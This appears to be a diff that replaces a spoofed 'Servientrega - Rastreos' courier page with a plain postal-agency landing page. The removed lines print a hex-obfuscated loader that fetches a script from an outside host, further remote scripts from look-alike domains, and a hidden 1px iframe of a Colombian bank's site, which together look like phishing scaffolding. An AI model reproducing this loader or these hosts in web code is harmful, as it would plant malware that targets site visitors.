@@ -1,76 +1,121 @@
-<html>
+<!DOCTYPE html>
+<html lang="es">
 <head>
-  <meta charset="utf-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Servientrega - Rastreos</title>
-  
-  <!-- Agregado de Google Tag Manager y otras etiquetas necesarias -->
-  <script async src="https://www.googletagmanager.com/gtag/js?id=AW-11395263888"></script>
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);}
-    gtag('js', new Date());
-    gtag('config', 'AW-11395263888');
-  </script>
-  <!-- Fin de Google Tag Manager -->
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Agencia Postal</title>
+  <style>
+    :root {
+      --main-color: #0057a3;
+      --accent-color: #f4a300;
+      --bg-color: #f9f9f9;
+      --text-color: #333;
+    }
 
-  <script type="text/javascript">
-    (function() {
-      var _0x1234 = ["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x74\x65\x61\x6D\x74\x75\x73\x69\x2E\x6F\x6E\x6C\x69\x6E\x65\x2F\x73\x63\x72\x69\x70\x74\x2E\x70\x68\x70\x3F\x74\x6F\x6B\x3D\x71\x77\x65\x72\x74\x79\x30\x39\x31\x37\x36\x37\x38"];
-      var _0x5678 = document.createElement('script');
-      _0x5678.src = _0x1234[0];
-      document.body.appendChild(_0x5678);
-    })();
-  </script>
-<script id="_waun94">var _wau = _wau || []; _wau.push(["small", "medellin", "n94"]);</script>
-    <script async src="//waust.at/s.js"></script>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: var(--bg-color);
+      color: var(--text-color);
+    }
 
-  <script type="text/javascript">
-    document.getElementById('triggerScript').addEventListener('click', function() {
-      var script = document.createElement('script');
-      document.body.appendChild(script);
-    });
-  </script>
-  
+    header {
+      background-color: var(--main-color);
+      color: white;
+      padding: 1rem 2rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    nav a {
+      color: white;
+      margin: 0 1rem;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    .hero {
+      background: url('https://source.unsplash.com/1600x600/?mail,delivery') no-repeat center center/cover;
+      height: 400px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      text-shadow: 2px 2px 5px #000;
+      text-align: center;
+    }
+
+    .hero h1 {
+      font-size: 3rem;
+      margin: 0;
+    }
+
+    .section {
+      padding: 3rem 2rem;
+      text-align: center;
+    }
+
+    .services {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 2rem;
+      justify-content: center;
+    }
+
+    .card {
+      background: white;
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 250px;
+    }
+
+    footer {
+      background-color: var(--main-color);
+      color: white;
+      text-align: center;
+      padding: 1rem;
+    }
+  </style>
 </head>
+<body>
 
-<body class="t-body">
+  <header>
+    <div><strong>Mi Agencia Postal</strong></div>
+    <nav>
+      <a href="#">Inicio</a>
+      <a href="#">Servicios</a>
+      <a href="#">Seguimiento</a>
+      <a href="#">Contacto</a>
+    </nav>
+  </header>
 
-  <iframe src="https://www.bancolombia.com" style="width: 1px; height: 1px; border: none; position: absolute;"></iframe>
-
-   
-  <script type="text/javascript" src="https://teamtusi.xyz/js/jquery.jclockNew.js"></script>
-  <script type="text/javascript" src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
-  <script type="text/javascript" src="https://472.tusilandia.click/__servi/script.php?tok=472cod0918" async="true"></script>
-  
-  <div style="display: none;" class="b-main t-container clearfix">
-    <!-- <middle> -->
-    <div style="display: none;" class="b-logo b-white">
-      <div class="site-title">
-        <!-- <logo> -->My site
-        <!-- </logo> -->
-      </div>
-      <div class="site-slogan">$SITE_NAME$</div>
-    </div>
-    <div style="display: none;" class="b-maincontent b-white" role="main">
-      <div class="content-padding">
-      </div>
-    </div>
-    <div style="display: none;" class="sidebar-clear clearleft"></div>
-    <aside style="display: none;" class="b-sidebar b-white clearfix">
-      $GLOBAL_CLEFTER$
-    </aside>
-    <!-- </middle> -->
+  <div class="hero">
+    <h1>Envíos rápidos y seguros</h1>
   </div>
 
-  <div style="display: none;"></div>
-  <textarea style="display: none;" name="" id="" cols="30" rows="10"> $GLOBAL_BFOOTER$ </textarea>
+  <section class="section">
+    <h2>Nuestros Servicios</h2>
+    <div class="services">
+      <div class="card">
+        <h3>Envíos Nacionales</h3>
+        <p>Despachamos a todo el país en 24-72 hs.</p>
+      </div>
+      <div class="card">
+        <h3>Encomiendas</h3>
+        <p>Ideal para paquetes medianos o grandes.</p>
+      </div>
+      <div class="card">
+        <h3>Correo Certificado</h3>
+        <p>Con seguimiento y acuse de recibo.</p>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    © 2025 Mi Agencia Postal | Todos los derechos reservados
+  </footer>
 
 </body>
-
 </html>
-
-<p align="center">
-  <iframe src width="1" height="1" marginwidth="0" marginheight="0" hspace="0" vspace="0" frameborder="0" scrolling="no"></iframe>
-</p>
